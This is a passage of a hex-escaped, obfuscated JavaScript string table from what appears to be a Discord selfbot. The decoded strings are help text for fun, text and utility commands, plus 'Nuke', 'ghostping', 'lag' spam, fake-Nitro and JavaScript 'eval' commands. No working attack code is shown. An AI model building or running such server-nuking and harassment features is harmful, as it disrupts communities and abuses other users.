\x6B\x20\x74\x6F\x20\x79\x6F\x75\x72\x73\x65\x6C\x66\x20\x61\x73\x20\x69\x66\x20\x69\x74\x27\x73\x20\x61\x20\x63\x68\x61\x74\x20\x62\x6F\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x68\x75\x67\x20\x3C\x75\x73\x65\x72\x3E\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x61\x6E\x69\x6D\x65\x20\x68\x75\x67\x67\x69\x6E\x67\x20\x67\x69\x66\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x6D\x65\x6D\x65\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x61\x20\x66\x72\x65\x73\x68\x20\x6D\x65\x6D\x65\x20\x6F\x66\x20\x74\x68\x65\x20\x69\x6E\x74\x65\x72\x6E\x65\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x70\x69\x6E\x67\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x74\x68\x65\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x61\x6E\x64\x20\x74\x68\x65\x20\x77\x65\x62\x73\x6F\x63\x6B\x65\x74\x20\x6C\x61\x74\x65\x6E\x63\x79\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x70\x61\x74\x20\x3C\x75\x73\x65\x72\x3E\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x61\x6E\x69\x6D\x65\x20\x70\x61\x74\x74\x69\x6E\x67\x20\x67\x69\x66\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x72\x61\x6E\x64\x6F\x6D\x74\x6F\x6B\x65\x6E\x20\xBB\x20\x47\x65\x6E\x65\x72\x61\x74\x65\x73\x20\x61\x20\x72\x61\x6E\x64\x6F\x6D\x20\x69\x6E\x76\x61\x6C\x69\x64\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x62\x6F\x74\x20\x74\x6F\x6B\x65\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x75\x70\x74\x69\x6D\x65\x20\xBB\x20\x53\x68\x6F\x77\x73\x20\x68\x6F\x77\x20\x6C\x6F\x6E\x67\x20\x74\x68\x65\x20\x62\x6F\x74\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x63\x75\x72\x72\x65\x6E\x74\x6C\x79\x20\x62\x65\x65\x6E\x20\x72\x75\x6E\x6E\x69\x6E\x67\x20\x66\x6F\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x77\x69\x6E\x6B\x20\x3C\x75\x73\x65\x72\x3E\x20\xBB\x20\x52\x61\x6E\x64\x6F\x6D\x20\x61\x6E\x69\x6D\x65\x20\x77\x69\x6E\x6B\x69\x6E\x67\x20\x67\x69\x66","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x31\x33\x33\x37\x20\x3C\x74\x65\x78\x74\x3E\x2A\x2A\x20\xBB\x20\x53\x70\x65\x61\x6B\x20\x31\x33\x33\x37\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x61\x73\x63\x69\x69\x20\x3C\x74\x65\x78\x74\x3E\x2A\x2A\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20\x61\x73\x63\x69\x69\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x62\x69\x6E\x61\x72\x79\x20\x3C\x65\x6E\x63\x6F\x64\x65\x7C\x64\x65\x63\x6F\x64\x65\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x7C\x62\x69\x6E\x61\x72\x79\x3E\x2A\x2A\x20\xBB\x20\x45\x6E\x63\x6F\x64\x65\x73\x2F\x64\x65\x63\x6F\x64\x65\x73\x20\x62\x69\x6E\x61\x72\x79\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x62\x61\x73\x65\x36\x34\x20\x3C\x65\x6E\x63\x6F\x64\x65\x7C\x64\x65\x63\x6F\x64\x65\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x7C\x62\x61\x73\x65\x36\x34\x3E\x2A\x2A\x20\xBB\x20\x45\x6E\x63\x6F\x64\x65\x73\x2F\x64\x65\x63\x6F\x64\x65\x73\x20\x62\x61\x73\x65\x36\x34\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x63\x65\x6D\x62\x65\x64\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x73\x3E\x2A\x2A\x20\xBB\x20\x54\x61\x6C\x6B\x20\x74\x6F\x20\x79\x6F\x75\x72\x73\x65\x6C\x66\x20\x61\x73\x20\x69\x66\x20\x69\x74\x27\x73\x20\x61\x20\x63\x68\x61\x74\x20\x62\x6F\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x65\x6D\x62\x65\x64\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x61\x6E\x20\x65\x6D\x62\x65\x64\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x65\x6D\x70\x74\x79\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x61\x6E\x20\x65\x6D\x70\x74\x79\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x65\x6D\x6F\x6A\x69\x66\x79\x20\x3C\x74\x65\x78\x74\x3E\x2A\x2A\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x20\x74\x6F\x20\x65\x6D\x6F\x6A\x69\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x72\x65\x76\x65\x72\x73\x65\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x52\x65\x76\x65\x72\x73\x65\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x61\x79\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x61\x79\x73\x20\x77\x68\x61\x74\x20\x65\x76\x65\x72\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x70\x6F\x6C\x69\x65\x72\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x20\x74\x6F\x20\x61\x20\x73\x70\x6F\x69\x6C\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x73\x67\x20\x3C\x62\x6F\x6C\x64\x7C\x69\x74\x61\x6C\x69\x63\x73\x7C\x75\x6E\x64\x65\x72\x6C\x69\x6E\x65\x7C\x64\x65\x73\x74\x72\x6F\x79\x7C\x75\x70\x70\x65\x72\x7C\x6C\x6F\x77\x65\x72\x7C\x73\x74\x72\x69\x6B\x65\x74\x68\x72\x6F\x75\x67\x68\x7C\x68\x69\x64\x64\x65\x6E\x7C\x65\x76\x65\x72\x79\x74\x68\x69\x6E\x67\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x69\x6E\x20\x64\x69\x66\x66\x65\x72\x65\x6E\x74\x20\x66\x6F\x72\x6D\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x54\x65\x78\x74\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x31\x33\x33\x37\x20\x3C\x74\x65\x78\x74\x3E\x20\xBB\x20\x53\x70\x65\x61\x6B\x20\x31\x33\x33\x37\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x61\x73\x63\x69\x69\x20\x3C\x74\x65\x78\x74\x3E\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20\x61\x73\x63\x69\x69\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x62\x69\x6E\x61\x72\x79\x20\x3C\x65\x6E\x63\x6F\x64\x65\x7C\x64\x65\x63\x6F\x64\x65\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x7C\x62\x69\x6E\x61\x72\x79\x3E\x20\xBB\x20\x45\x6E\x63\x6F\x64\x65\x73\x2F\x64\x65\x63\x6F\x64\x65\x73\x20\x62\x69\x6E\x61\x72\x79\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x62\x61\x73\x65\x36\x34\x20\x3C\x65\x6E\x63\x6F\x64\x65\x7C\x64\x65\x63\x6F\x64\x65\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x7C\x62\x61\x73\x65\x36\x34\x3E\x20\xBB\x20\x45\x6E\x63\x6F\x64\x65\x73\x2F\x64\x65\x63\x6F\x64\x65\x73\x20\x62\x61\x73\x65\x36\x34\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x63\x65\x6D\x62\x65\x64\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x73\x3E\x20\xBB\x20\x54\x61\x6C\x6B\x20\x74\x6F\x20\x79\x6F\x75\x72\x73\x65\x6C\x66\x20\x61\x73\x20\x69\x66\x20\x69\x74\x27\x73\x20\x61\x20\x63\x68\x61\x74\x20\x62\x6F\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x65\x6D\x62\x65\x64\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x61\x6E\x20\x65\x6D\x62\x65\x64\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x65\x6D\x70\x74\x79\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x61\x6E\x20\x65\x6D\x70\x74\x79\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x65\x6D\x6F\x6A\x69\x66\x79\x20\x3C\x74\x65\x78\x74\x3E\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x20\x74\x6F\x20\x65\x6D\x6F\x6A\x69\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x72\x65\x76\x65\x72\x73\x65\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x52\x65\x76\x65\x72\x73\x65\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x73\x61\x79\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x61\x79\x73\x20\x77\x68\x61\x74\x20\x65\x76\x65\x72\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x73\x70\x6F\x6C\x69\x65\x72\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x20\x74\x6F\x20\x61\x20\x73\x70\x6F\x69\x6C\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x6D\x73\x67\x20\x3C\x62\x6F\x6C\x64\x7C\x69\x74\x61\x6C\x69\x63\x73\x7C\x75\x6E\x64\x65\x72\x6C\x69\x6E\x65\x7C\x64\x65\x73\x74\x72\x6F\x79\x7C\x75\x70\x70\x65\x72\x7C\x6C\x6F\x77\x65\x72\x7C\x73\x74\x72\x69\x6B\x65\x74\x68\x72\x6F\x75\x67\x68\x7C\x68\x69\x64\x64\x65\x6E\x7C\x65\x76\x65\x72\x79\x74\x68\x69\x6E\x67\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x69\x6E\x20\x64\x69\x66\x66\x65\x72\x65\x6E\x74\x20\x66\x6F\x72\x6D\x73","\x31\x33\x33\x37","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x73\x6F\x6D\x65\x20\x74\x65\x78\x74\x20\x74\x6F\x20\x73\x70\x65\x61\x6B\x20\x69\x6E\x20\x31\x33\x33\x37","\x55","\x7C\x5F\x7C","\x75","\x4F","\x30","\x6F","\x49","\x21","\x69","\x45","\x33","\x65","\x41","\x34","\x61","\x75\x74\x69\x6C\x69\x74\x79","\x61\x66\x6B\x20\x3C\x6F\x6E\x20\x2D\x20\x6F\x66\x66\x3E\x2A\x2A\x20\xBB\x20\x45\x6E\x61\x62\x65\x6C\x73\x20\x6F\x72\x20\x44\x69\x73\x61\x62\x6C\x65\x73\x20\x61\x66\x6B\x20\x6D\x6F\x64\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x63\x6C\x65\x61\x6E\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x2A\x2A\x20\xBB\x20\x44\x65\x6C\x65\x74\x65\x73\x20\x74\x68\x65\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x63\x6F\x64\x65\x62\x6C\x6F\x63\x6B\x20\x3C\x74\x79\x70\x65\x3E\x20\x3C\x63\x6F\x64\x65\x3E\x2A\x2A\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x20\x74\x6F\x20\x61\x20\x63\x6F\x64\x65\x20\x62\x6C\x6F\x63\x6B\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x65\x76\x61\x6C\x20\x3C\x63\x6F\x64\x65\x3E\x2A\x2A\x20\xBB\x20\x45\x76\x61\x6C\x75\x61\x74\x65\x73\x20\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x20\x63\x6F\x64\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x68\x61\x73\x74\x65\x62\x69\x6E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20\x61\x20\x68\x61\x73\x74\x65\x62\x69\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x61\x73\x73\x72\x65\x61\x63\x74\x20\x3C\x65\x6D\x6F\x6A\x69\x3E\x2A\x2A\x20\xBB\x20\x41\x64\x64\x73\x20\x61\x20\x72\x65\x61\x63\x74\x69\x6F\x6E\x20\x74\x6F\x20\x61\x6C\x6C\x20\x63\x61\x63\x68\x65\x64\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x20\x69\x6E\x20\x74\x68\x65\x20\x63\x68\x61\x6E\x6E\x65\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x6E\x69\x70\x65\x20\x5B\x70\x61\x67\x65\x2D\x6E\x75\x6D\x5D\x2A\x2A\x20\xBB\x20\x53\x6E\x69\x70\x65\x73\x20\x74\x68\x65\x20\x72\x65\x63\x65\x6E\x74\x6C\x79\x20\x64\x65\x6C\x65\x74\x65\x64\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x55\x74\x69\x6C\x69\x74\x79\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x61\x66\x6B\x20\x3C\x6F\x6E\x20\x2D\x20\x6F\x66\x66\x3E\x20\xBB\x20\x45\x6E\x61\x62\x65\x6C\x73\x20\x6F\x72\x20\x44\x69\x73\x61\x62\x6C\x65\x73\x20\x61\x66\x6B\x20\x6D\x6F\x64\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x63\x6C\x65\x61\x6E\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x20\xBB\x20\x44\x65\x6C\x65\x74\x65\x73\x20\x74\x68\x65\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x63\x6F\x64\x65\x62\x6C\x6F\x63\x6B\x20\x3C\x74\x79\x70\x65\x3E\x20\x3C\x63\x6F\x64\x65\x3E\x20\xBB\x20\x43\x6F\x6E\x76\x65\x72\x74\x73\x20\x79\x6F\x75\x72\x20\x74\x65\x78\x74\x20\x74\x6F\x20\x61\x20\x63\x6F\x64\x65\x20\x62\x6C\x6F\x63\x6B\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x65\x76\x61\x6C\x20\x3C\x63\x6F\x64\x65\x3E\x20\xBB\x20\x45\x76\x61\x6C\x75\x61\x74\x65\x73\x20\x4A\x61\x76\x61\x53\x63\x72\x69\x70\x74\x20\x63\x6F\x64\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x6D\x61\x73\x73\x72\x65\x61\x63\x74\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x6F\x20\x61\x20\x68\x61\x73\x74\x65\x20\x62\x69\x6E\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x73\x6E\x69\x70\x65\x20\x5B\x70\x61\x67\x65\x2D\x6E\x75\x6D\x5D\x20\xBB\x20\x53\x6E\x69\x70\x65\x73\x20\x74\x68\x65\x20\x72\x65\x63\x65\x6E\x74\x6C\x79\x20\x64\x65\x6C\x65\x74\x65\x64\x20\x6D\x65\x73\x73\x61\x67\x65","\x68\x65\x6C\x70","\x61\x6E\x69\x6D\x61\x6C\x73\x2A\x2A\x20\xBB\x20\x41\x6E\x69\x6D\x61\x6C\x73\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x61\x63\x63\x6F\x75\x6E\x74\x2A\x2A\x20\xBB\x20\x41\x63\x63\x6F\x75\x6E\x74\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x61\x62\x75\x73\x65\x2A\x2A\x20\xBB\x20\x4E\x75\x6B\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x66\x75\x6E\x2A\x2A\x20\xBB\x20\x46\x75\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x69\x6E\x66\x6F\x2A\x2A\x20\xBB\x20\x49\x6E\x66\x6F\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6D\x6F\x64\x65\x72\x61\x74\x69\x6F\x6E\x2A\x2A\x20\xBB\x20\x4D\x6F\x64\x65\x72\x61\x74\x69\x6F\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x74\x61\x74\x75\x73\x2A\x2A\x20\xBB\x20\x53\x74\x61\x74\x75\x73\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x74\x72\x6F\x6C\x6C\x2A\x2A\x20\xBB\x20\x54\x72\x6F\x6C\x6C\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x74\x65\x78\x74\x2A\x2A\x20\xBB\x20\x54\x65\x78\x74\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x66\x61\x63\x65\x2A\x2A\x20\xBB\x20\x46\x61\x63\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x75\x74\x69\x6C\x69\x74\x79\x2A\x2A\x20\xBB\x20\x55\x74\x69\x6C\x69\x74\x79\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x41\x76\x61\x69\x6C\x61\x62\x6C\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x61\x6E\x69\x6D\x61\x6C\x73\x20\xBB\x20\x41\x6E\x69\x6D\x61\x6C\x73\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x61\x63\x63\x6F\x75\x6E\x74\x20\xBB\x20\x41\x63\x63\x6F\x75\x6E\x74\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x61\x62\x75\x73\x69\x76\x65\x20\xBB\x20\x4E\x75\x6B\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x66\x75\x6E\x20\xBB\x20\x46\x75\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x69\x6E\x66\x6F\x20\xBB\x20\x49\x6E\x66\x6F\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x6D\x6F\x64\x65\x72\x61\x74\x69\x6F\x6E\x20\xBB\x20\x4D\x6F\x64\x65\x72\x61\x74\x69\x6F\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x73\x74\x61\x74\x75\x73\x20\xBB\x20\x53\x74\x61\x74\x75\x73\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x74\x72\x6F\x6C\x6C\x20\xBB\x20\x54\x72\x6F\x6C\x6C\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x66\x61\x63\x65\x20\xBB\x20\x46\x61\x63\x65\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x75\x74\x69\x6C\x69\x74\x79\x20\xBB\x20\x55\x74\x69\x6C\x69\x74\x79\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x74\x72\x6F\x6C\x6C","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x67\x68\x6F\x73\x74\x70\x69\x6E\x67\x20\x3C\x63\x68\x61\x6E\x6E\x65\x6C\x2D\x69\x64\x3E\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x2A\x2A\x20\xBB\x20\x47\x68\x6F\x73\x74\x70\x69\x6E\x67\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x20\x69\x6E\x20\x74\x68\x65\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x68\x61\x63\x6B\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x2A\x2A\x20\xBB\x20\x48\x61\x63\x6B\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6C\x61\x67\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x20\x74\x68\x65\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x6C\x61\x67\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6E\x69\x74\x72\x6F\x2A\x2A\x20\xBB\x20\x47\x65\x6E\x65\x72\x61\x74\x65\x73\x20\x61\x20\x72\x61\x6E\x64\x6F\x6D\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x6E\x69\x74\x72\x6F\x20\x63\x6F\x64\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x66\x61\x6B\x65\x6E\x69\x74\x72\x6F\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x20\x61\x20\x64\x69\x73\x63\x6F\x72\x20\x6E\x69\x74\x72\x6F\x20\x72\x69\x63\x6B\x20\x72\x6F\x6C\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20","\x54\x72\x6F\x6C\x6C\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x54\x72\x6F\x6C\x6C\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\